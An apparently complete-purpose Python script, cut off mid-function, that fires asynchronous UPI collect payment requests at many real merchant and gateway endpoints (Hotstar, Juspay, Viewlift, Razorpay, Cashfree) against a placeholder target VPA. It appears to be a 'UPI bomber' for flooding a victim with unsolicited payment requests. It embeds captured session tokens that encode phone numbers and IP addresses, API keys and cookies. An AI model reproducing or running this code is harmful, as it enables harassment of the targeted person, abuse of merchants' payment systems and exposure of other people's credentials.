import time
import asyncio
import aiohttp
import os
def upi():
    async def OTTplay():
        try:
            data = {
                'upi_vpa': 'jbx',
                'txn_type': 'UPI_COLLECT',
                'save_to_locker': 'true',
                'redirect_after_payment': 'true',
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'payment_channel': 'WEB',
                'order_id': 'HTELC4LC1691243952034',
                'metadata': '{"pp_mode":"RELEASE","payment_channel":"WEB","microapp":"hyperpay"}',
                'merchant_id': 'htott',
                'format': 'json',
                'additional_payment_details': '[]',
                'add_merchant_return_url': 'true',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', data=data) as response:
                    pass
        except Exception as e:
            pass


    async def hotstar1():
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9554929436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass
                    
    async def kanchalanka():
        try:
            headers = {
                'authority': 'prod-api.viewlift.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIzZTczNTlkNy1mYmZkLTRhMDgtYjliNy0xNmNhZTJkZmQ3MjMiLCJzaXRlIjoicGFyaWphIiwic2l0ZUlkIjoiZmYxNjRlMTAtYWMzOC0xMWViLTk1MGItZGJlZjFlMzRjMTlhIiwiaXBhZGRyZXNzZXMiOiIxMDMuMTgwLjk0LjE4NCwgMTAuMTIwLjQxLjMwLCAzNS4xNzQuMTI5Ljc3LCAxMzAuMTc2Ljk4LjkyIiwiZW1haWwiOiIrOTE5NTU0OTI5NDM2QHBhcmlqYS5jb20iLCJjb3VudHJ5Q29kZSI6IklOIiwicG9zdGFsY29kZSI6IjExMDAwNSIsInByb3ZpZGVyIjoidmlld2xpZnQiLCJsb2dpblZpYSI6IlBIT05FIiwiZGV2aWNlSWQiOiJicm93c2VyLTk4MjllNzFhLTdkMDUtZWQwNS03MTUwLTQ3YmM0MGZlMDc4OSIsImlhdCI6MTY5MTIyNTYxOSwiZXhwIjoxNjkxODMwNDE5fQ.VtQbLcfoOkf5vlrYXIj9G4Y7jVac22BgnBE1iMStJ8s',
                'content-type': 'application/json',
                'origin': 'https://www.kancchalannka.com',
                'referer': 'https://www.kancchalannka.com/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
            }

            json_data = {
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'txn_type': 'UPI_COLLECT',
                'upi_vpa': '56454645',
                'redirect_after_payment': 'true',
                'format': 'json',
                'order_id': 'lUlUEX327zn16F',
                'merchant_id': 'kancchalannka',
                'mobile_number': '+91464646644',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://prod-api.viewlift.com/subscription/payment', headers=headers, json=json_data) as response:
                    pass
        except Exception as e:
            pass

    async def hindustanmedia():
        try:
            data = {
            'upi_vpa': '7854',
            'txn_type': 'UPI_COLLECT',
            'save_to_locker': 'true',
            'redirect_after_payment': 'true',
            'payment_method_type': 'UPI',
            'payment_method': 'UPI',
            'payment_channel': 'WEB',
            'order_id': 'HTVTEHNY1691219098814',
            'metadata': '{"pp_mode":"RELEASE","payment_channel":"WEB","microapp":"hyperpay"}',
            'merchant_id': 'htott',
            'format': 'json',
            'additional_payment_details': '[]',
            'add_merchant_return_url': 'true',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', data=data) as response:
                    pass

        except Exception as e:
            pass

    async def hindustanmedia2():
        try:
            headers = {
            'authority': 'public.releases.juspay.in',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://public.releases.juspay.in',
            'sdk-app-name': 'unknown_appname',
            'sdk-client-id': 'htott',
            'sdk-godel-build-version': 'unknown_build',
            'sdk-godel-version': '3.7.3',
            'sdk-is-saved-vpa': 'false',
            'sdk-os': 'WEB',
            'sdk-ppflow': 'paymentpage',
            'sdk-redirection-flow': 'true',
            'sdk-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'sdk-version-ec': '3.3.3',
            'sdk-version-flyer': '2.5.2',
            'sdk-version-hyperos': '1.0.0-hyper-core-web.20',
            'sdk-version-hyperos-config': '52658646634463423',
            'sdk-version-hyperos-tracker': '2.0.44',
            'sdk-version-hyperpay': '3.30.1-release-20230622.4',
            'sdk-version-hyperpay-config': '2.27',
            'sdk-version-hyperpay-icons': '2.27',
            'sdk-version-hyperpay-strings': '2.27',
            'sdk-version-upiintent': '4.0.1',
            'sdk-version-upiintent-config': '2.0.93',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'x-jp-merchant-id': 'htott',
            'x-merchantid': 'htott',
            'x-session-id': 'fd6facc3-e2af-4c69-b49d-d32f359d4804',
            }

            data = 'upi_vpa=&txn_type=UPI_COLLECT&save_to_locker=true&redirect_after_payment=true&payment_method_type=UPI&payment_method=UPI&payment_channel=WEB&order_id=HTBNM4LP1691218921418&metadata=%7B%22pp_mode%22%3A%22RELEASE%22%2C%22payment_channel%22%3A%22WEB%22%2C%22microapp%22%3A%22hyperpay%22%7D&merchant_id=htott&format=json&additional_payment_details=%5B%5D&add_merchant_return_url=true'
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://public.releases.juspay.in/wapi/txns', headers=headers, data=data) as response:
                    pass
        except Exception as e:
            pass
        

    async def hoichoi():
            try:
                headers = {
                'authority': 'prod-api.viewlift.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0Mjg3OTFhMy1iNjU2LTRmMjgtYTk5ZC05YzNjODljNjQyYzciLCJzaXRlIjoiaG9pY2hvaXR2Iiwic2l0ZUlkIjoiN2ZhMGVhOWEtOTc5OS00NDE3LTk5ZjUtY2JiNTM0M2M1NTFkIiwiZW1haWwiOiIrOTE4MDA0MzYwODMyQGhvaWNob2l0di5jb20iLCJpcGFkZHJlc3NlcyI6IjEwMy4xODAuOTQuMTU0LCAxMC4xMjAuMy4wLCA1NC4yMjQuMjA5LjE2LCAxMzAuMTc2Ljk4LjE1OCIsImNvdW50cnlDb2RlIjoiSU4iLCJwb3N0YWxjb2RlIjoiMTEwMDAxIiwicHJvdmlkZXIiOiJ2aWV3bGlmdCIsImRldmljZUlkIjoiYnJvd3Nlci0yODVjNmM4ZC0yYTJjLTkxZDEtMmRlMS1hYjY3Y2Q2ZjJmODUiLCJpZCI6IjQyODc5MWEzLWI2NTYtNGYyOC1hOTlkLTljM2M4OWM2NDJjNyIsInBob25lTnVtYmVyIjoiKzkxODAwNDM2MDgzMiIsInBob25lQ29kZSI6OTEsImxvZ2luVmlhIjoiUEhPTkUiLCJpYXQiOjE2OTEyMTUxNzAsImV4cCI6MTY5MTgxOTk3MH0.oMkBeyTZXbfNAxK5WJmGnJitjOmCRC3gLTGgTvAhFmw',
                'content-type': 'application/json',
                'origin': 'https://www.hoichoi.tv',
                'referer': 'https://www.hoichoi.tv/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                }

                json_data = {
                'payment_method_type': 'UPI',
                'payment_method': 'UPI',
                'txn_type': 'UPI_COLLECT',
                'upi_vpa': 'vffchfgh',
                'redirect_after_payment': 'true',
                'format': 'json',
                'order_id': 'WXqEBaq6Blaz6U',
                'merchant_id': 'hoichoi',
                'mobile_number': '+9186360832',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://prod-api.viewlift.com/subscription/payment', headers=headers, json=json_data) as response:
                        pass
            except Exception as e:
                pass


    async def doubtnut():
            try:
                json_data = {
                    'amount': '999900',
                    'email': 'payments+280345612@doubtnut.com',
                    'contact': '9554929436',
                    'order_id': 'order_MO49ILKIeLc67a',
                    'method': 'upi',
                    'currency': 'INR',
                    '_': {
                        'shield': {
                            'fhash': 'ec92e99b9f238cc9bd8f6107068a99822a2850ec',
                            'tz': '330',
                        },
                        'device_id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'build': '5786243975',
                        'checkout_id': 'MO44rBG7DibE2Y',
                        'device.id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'library': 'razorpayjs',
                        'library_src': 'razorpay.js',
                        'current_script_src': 'razorpay.js',
                        'platform': 'browser',
                        'referer': 'https://www.doubtnut.com/checkout',
                        'request_index': '0',
                    },
                    'upi': {
                        'flow': 'collect',
                        'type': 'default',
                    },
                    'vpa': '€tor',
                    'key_id': 'rzp_live_XyamWBU7SyKaDl',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://api.razorpay.com/v1/payments/create/ajax',  json=json_data) as response:
                        pass
            except Exception as e:
                pass



    async def codehelp():
            try:
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    # 'Cookie': '_gcl_au=1.1.461908053.1689659981; _fbp=fb.1.1689659981104.1496497437; _hjSessionUser_2274349=eyJpZCI6ImFmYTRhMjE4LTQ0YjEtNTY1YS1iOTc5LWQwYjFmZWY2MjNlMiIsImNyZWF0ZWQiOjE2ODk2NTk5ODA4NTAsImV4aXN0aW5nIjp0cnVlfQ==; _clck=1d7t3hw|2|fdt|0|1294; _ga=GA1.2.1966163901.1689659981; _gac_UA-123341110-1=1.1689659981.Cj0KCQjwzdOlBhCNARIsAPMwjbzu5SQ3XMC7dS7rKrsF-tT4BhN7VJad9vUdSi8YkMXIBSupoiNgqNAaAmu4EALw_wcB%252525252525252525252F; _uetvid=491117f0253011eea63bd911185058c5; _ga_F19RSXEWZ1=GS1.2.1691003399.2.1.1691003503.31.0.0; _hp2_id.3604296384=%7B%22userId%22%3A%227918721590432041%22%2C%22pageviewId%22%3A%224832973894228290%22%2C%22sessionId%22%3A%225285495433984639%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_N3JT838K9P=GS1.1.1691003396.2.1.1691003504.30.0.0; cfp_pa_session_id=cQE6ICx8WIUOxGMI70et__2023-09-08 23:11:10__hwcSA3EwQiVPf9ReEim3zS0aSqKZryL4BzN6ko9r2l0=__swsxFvZA115Rq3xsHNelKUqybvogtUp4unIoTWz8x9M=',
                    'Origin': 'https://payments.cashfree.com',
                    'Referer': 'https://payments.cashfree.com/order/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'X-CF-CLIENT-ID': '_or06obtnn',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                json_data = {
                    'upiProvider': 'vpa',
                    'upiVpa': '€tor',
                    'orderHash': 'cQE6ICx8WIUOxGMI70et',
                }

                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
    'https://payments.cashfree.com/pgbillpayuiapi/upi/create/collect',
   
    headers=headers,
    json=json_data,
) as response:
                        pass
            except Exception as e:
                pass

    async def doubtnut1():
            try:
                json_data = {
                    'amount': '999900',
                    'email': 'payments+280345612@doubtnut.com',
                    'contact': '9587929436',
                    'order_id': 'order_MO49ILKIeLc67a',
                    'method': 'upi',
                    'currency': 'INR',
                    '_': {
                        'shield': {
                            'fhash': 'ec92e99b9f238cc9bd8f6107068a99822a2850ec',
                            'tz': '330',
                        },
                        'device_id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'build': '5786243975',
                        'checkout_id': 'MO44rBG7DibE2Y',
                        'device.id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'library': 'razorpayjs',
                        'library_src': 'razorpay.js',
                        'current_script_src': 'razorpay.js',
                        'platform': 'browser',
                        'referer': 'https://www.doubtnut.com/checkout',
                        'request_index': '0',
                    },
                    'upi': {
                        'flow': 'collect',
                        'type': 'default',
                    },
                    'vpa': '€tor',
                    'key_id': 'rzp_live_XyamWBU7SyKaDl',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://api.razorpay.com/v1/payments/create/ajax',  json=json_data) as response:
                        pass
            except Exception as e:
                pass



    async def codehelp1():
            try:
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    # 'Cookie': '_gcl_au=1.1.461908053.1689659981; _fbp=fb.1.1689659981104.1496497437; _hjSessionUser_2274349=eyJpZCI6ImFmYTRhMjE4LTQ0YjEtNTY1YS1iOTc5LWQwYjFmZWY2MjNlMiIsImNyZWF0ZWQiOjE2ODk2NTk5ODA4NTAsImV4aXN0aW5nIjp0cnVlfQ==; _clck=1d7t3hw|2|fdt|0|1294; _ga=GA1.2.1966163901.1689659981; _gac_UA-123341110-1=1.1689659981.Cj0KCQjwzdOlBhCNARIsAPMwjbzu5SQ3XMC7dS7rKrsF-tT4BhN7VJad9vUdSi8YkMXIBSupoiNgqNAaAmu4EALw_wcB%252525252525252525252F; _uetvid=491117f0253011eea63bd911185058c5; _ga_F19RSXEWZ1=GS1.2.1691003399.2.1.1691003503.31.0.0; _hp2_id.3604296384=%7B%22userId%22%3A%227918721590432041%22%2C%22pageviewId%22%3A%224832973894228290%22%2C%22sessionId%22%3A%225285495433984639%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_N3JT838K9P=GS1.1.1691003396.2.1.1691003504.30.0.0; cfp_pa_session_id=cQE6ICx8WIUOxGMI70et__2023-09-08 23:11:10__hwcSA3EwQiVPf9ReEim3zS0aSqKZryL4BzN6ko9r2l0=__swsxFvZA115Rq3xsHNelKUqybvogtUp4unIoTWz8x9M=',
                    'Origin': 'https://payments.cashfree.com',
                    'Referer': 'https://payments.cashfree.com/order/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'X-CF-CLIENT-ID': '_or06obtnn',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                json_data = {
                    'upiProvider': 'vpa',
                    'upiVpa': '€tor',
                    'orderHash': 'cQE6ICx8WIUOxGMI70et',
                }

                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
    'https://payments.cashfree.com/pgbillpayuiapi/upi/create/collect',
   
    headers=headers,
    json=json_data,
) as response:
                        pass
            except Exception as e:
                pass

    async def doubtnut2():
            try:
                json_data = {
                    'amount': '999900',
                    'email': 'payments+280345612@doubtnut.com',
                    'contact': '9558789436',
                    'order_id': 'order_MO49ILKIeLc67a',
                    'method': 'upi',
                    'currency': 'INR',
                    '_': {
                        'shield': {
                            'fhash': 'ec92e99b9f238cc9bd8f6107068a99822a2850ec',
                            'tz': '330',
                        },
                        'device_id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'build': '5786243975',
                        'checkout_id': 'MO44rBG7DibE2Y',
                        'device.id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'library': 'razorpayjs',
                        'library_src': 'razorpay.js',
                        'current_script_src': 'razorpay.js',
                        'platform': 'browser',
                        'referer': 'https://www.doubtnut.com/checkout',
                        'request_index': '0',
                    },
                    'upi': {
                        'flow': 'collect',
                        'type': 'default',
                    },
                    'vpa': '€tor',
                    'key_id': 'rzp_live_XyamWBU7SyKaDl',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://api.razorpay.com/v1/payments/create/ajax',  json=json_data) as response:
                        pass
            except Exception as e:
                pass



    async def codehelp2():
            try:
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    # 'Cookie': '_gcl_au=1.1.461908053.1689659981; _fbp=fb.1.1689659981104.1496497437; _hjSessionUser_2274349=eyJpZCI6ImFmYTRhMjE4LTQ0YjEtNTY1YS1iOTc5LWQwYjFmZWY2MjNlMiIsImNyZWF0ZWQiOjE2ODk2NTk5ODA4NTAsImV4aXN0aW5nIjp0cnVlfQ==; _clck=1d7t3hw|2|fdt|0|1294; _ga=GA1.2.1966163901.1689659981; _gac_UA-123341110-1=1.1689659981.Cj0KCQjwzdOlBhCNARIsAPMwjbzu5SQ3XMC7dS7rKrsF-tT4BhN7VJad9vUdSi8YkMXIBSupoiNgqNAaAmu4EALw_wcB%252525252525252525252F; _uetvid=491117f0253011eea63bd911185058c5; _ga_F19RSXEWZ1=GS1.2.1691003399.2.1.1691003503.31.0.0; _hp2_id.3604296384=%7B%22userId%22%3A%227918721590432041%22%2C%22pageviewId%22%3A%224832973894228290%22%2C%22sessionId%22%3A%225285495433984639%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_N3JT838K9P=GS1.1.1691003396.2.1.1691003504.30.0.0; cfp_pa_session_id=cQE6ICx8WIUOxGMI70et__2023-09-08 23:11:10__hwcSA3EwQiVPf9ReEim3zS0aSqKZryL4BzN6ko9r2l0=__swsxFvZA115Rq3xsHNelKUqybvogtUp4unIoTWz8x9M=',
                    'Origin': 'https://payments.cashfree.com',
                    'Referer': 'https://payments.cashfree.com/order/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'X-CF-CLIENT-ID': '_or06obtnn',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                json_data = {
                    'upiProvider': 'vpa',
                    'upiVpa': '€tor',
                    'orderHash': 'cQE6ICx8WIUOxGMI70et',
                }

                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
    'https://payments.cashfree.com/pgbillpayuiapi/upi/create/collect',
   
    headers=headers,
    json=json_data,
) as response:
                        pass
            except Exception as e:
                pass

    async def doubtnut3():
            try:
                json_data = {
                    'amount': '999900',
                    'email': 'payments+280345612@doubtnut.com',
                    'contact': '9512329436',
                    'order_id': 'order_MO49ILKIeLc67a',
                    'method': 'upi',
                    'currency': 'INR',
                    '_': {
                        'shield': {
                            'fhash': 'ec92e99b9f238cc9bd8f6107068a99822a2850ec',
                            'tz': '330',
                        },
                        'device_id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'build': '5786243975',
                        'checkout_id': 'MO44rBG7DibE2Y',
                        'device.id': '1.ec92e99b9f238cc9bd8f6107068a99822a2850ec.1691604828964.15844042',
                        'library': 'razorpayjs',
                        'library_src': 'razorpay.js',
                        'current_script_src': 'razorpay.js',
                        'platform': 'browser',
                        'referer': 'https://www.doubtnut.com/checkout',
                        'request_index': '0',
                    },
                    'upi': {
                        'flow': 'collect',
                        'type': 'default',
                    },
                    'vpa': '€tor',
                    'key_id': 'rzp_live_XyamWBU7SyKaDl',
                }
                async with aiohttp.ClientSession() as sess:
                    async with sess.post('https://api.razorpay.com/v1/payments/create/ajax',  json=json_data) as response:
                        pass
            except Exception as e:
                pass



    async def codehelp3():
            try:
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    # 'Cookie': '_gcl_au=1.1.461908053.1689659981; _fbp=fb.1.1689659981104.1496497437; _hjSessionUser_2274349=eyJpZCI6ImFmYTRhMjE4LTQ0YjEtNTY1YS1iOTc5LWQwYjFmZWY2MjNlMiIsImNyZWF0ZWQiOjE2ODk2NTk5ODA4NTAsImV4aXN0aW5nIjp0cnVlfQ==; _clck=1d7t3hw|2|fdt|0|1294; _ga=GA1.2.1966163901.1689659981; _gac_UA-123341110-1=1.1689659981.Cj0KCQjwzdOlBhCNARIsAPMwjbzu5SQ3XMC7dS7rKrsF-tT4BhN7VJad9vUdSi8YkMXIBSupoiNgqNAaAmu4EALw_wcB%252525252525252525252F; _uetvid=491117f0253011eea63bd911185058c5; _ga_F19RSXEWZ1=GS1.2.1691003399.2.1.1691003503.31.0.0; _hp2_id.3604296384=%7B%22userId%22%3A%227918721590432041%22%2C%22pageviewId%22%3A%224832973894228290%22%2C%22sessionId%22%3A%225285495433984639%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_N3JT838K9P=GS1.1.1691003396.2.1.1691003504.30.0.0; cfp_pa_session_id=cQE6ICx8WIUOxGMI70et__2023-09-08 23:11:10__hwcSA3EwQiVPf9ReEim3zS0aSqKZryL4BzN6ko9r2l0=__swsxFvZA115Rq3xsHNelKUqybvogtUp4unIoTWz8x9M=',
                    'Origin': 'https://payments.cashfree.com',
                    'Referer': 'https://payments.cashfree.com/order/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'X-CF-CLIENT-ID': '_or06obtnn',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }

                json_data = {
                    'upiProvider': 'vpa',
                    'upiVpa': '€tor',
                    'orderHash': 'cQE6ICx8WIUOxGMI70et',
                }

                async with aiohttp.ClientSession() as sess:
                    async with sess.post(
    'https://payments.cashfree.com/pgbillpayuiapi/upi/create/collect',
   
    headers=headers,
    json=json_data,
) as response:
                        pass
            except Exception as e:
                pass

    async def hotstar2():
        try:
            headers = {
                'authority': 'www.hotstar.com',
